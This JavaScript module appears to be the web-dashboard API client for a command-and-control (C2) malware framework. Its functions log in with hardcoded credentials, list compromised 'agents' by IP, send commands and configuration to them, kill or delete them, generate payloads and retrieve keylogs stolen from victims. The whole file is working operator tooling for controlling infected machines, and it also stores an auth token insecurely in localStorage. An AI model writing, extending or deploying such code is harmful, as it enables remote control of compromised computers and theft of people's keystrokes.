import axios from 'axios';
const C2_ENDPOINT = process.env.REACT_APP_NGINX_IP ? `http://${process.env.REACT_APP_NGINX_IP}:${process.env.REACT_APP_NGINX_PORT}` : `http://${process.env.REACT_APP_WEBSERVER_IP}:${process.env.REACT_APP_WEBSERVER_PORT}`;
export { C2_ENDPOINT };

export const login = async () => {
    try {
      // Make a POST request to the login endpoint with username and password
      const response = await axios.post(`${C2_ENDPOINT}/login`, { "username": "patron", "password": "password1!" });
      
      // Extract the API token from the response
      const { token } = response.data;
  
      // Store the API token in localStorage or sessionStorage
      localStorage.setItem('authToken', token);
  
      // Return the API token
      return token;
    } catch (error) {
      // Handle login errors
      console.error('Error logging in:', error);
      throw error; // Rethrow error to be handled by the caller
    }
  };

export const getCallbacks = async () => {
    try {
        // Fetch authentication token from localStorage or sessionStorage
        const authToken = localStorage.getItem('authToken') || sessionStorage.getItem('authToken');
 
        // Set authentication headers
        const headers = {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${authToken}`, // Assuming your backend expects Bearer token authentication
        };
  
        // Make authenticated request
        const response = await axios.get(`${C2_ENDPOINT}/api/agents`, { headers });
      
        // Handle successful response
        console.log(response.data);
        return {
            payload: response.data,
        };
        } catch (error) {
        // Handle errors
        console.error('Error fetching callbacks:', error);
        throw error; // Rethrow error to be handled by the caller
    }
  };

export var getIps = async () => {

    const request = await axios.get(`${C2_ENDPOINT}/api/groupagents`, { withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var getCallbacksByIp = async (ip) => {

    const request = await axios.get(`${C2_ENDPOINT}/api/groupagents/${ip}`, { withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var getPayloads = async () => {

    const request = await axios.get(`${C2_ENDPOINT}/api/payloads`, { withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var getAgent = async (id) => {

    const request = await axios.get(`${C2_ENDPOINT}/api/agent/${id}`, { withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var getOneAgent = async (id) => {

    const request = await axios.get(`${C2_ENDPOINT}/api/oneagent/${id}`, { withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var sendConfig = async (id,command) => {

    const request = await axios.post(`${C2_ENDPOINT}/api/updateagent/${id}`,command, {headers: {
        'Content-Type': 'application/json'
      }, withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var killAgent = async (id) => {

    const request = await axios.get(`${C2_ENDPOINT}/api/killagent/${id}`, {headers: {
        'Content-Type': 'application/json'
      }, withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var deleteAgent = async (id) => {

    const request = await axios.get(`${C2_ENDPOINT}/api/deleteagent/${id}`, {headers: {
        'Content-Type': 'application/json'
      }, withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var sendCommand = async (id,command) => {

    const request = await axios.post(`${C2_ENDPOINT}/api/agent/${id}`,command, {headers: {
        'Content-Type': 'application/json'
      }, withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var genPayload = async (command) => {

    const request = await axios.post(`${C2_ENDPOINT}/api/payload`,command, {headers: {
        'Content-Type': 'application/json'
      }, withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var getKeylog = async (id) => {

    const request = await axios.get(`${C2_ENDPOINT}/api/keylog/${id}`, { withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}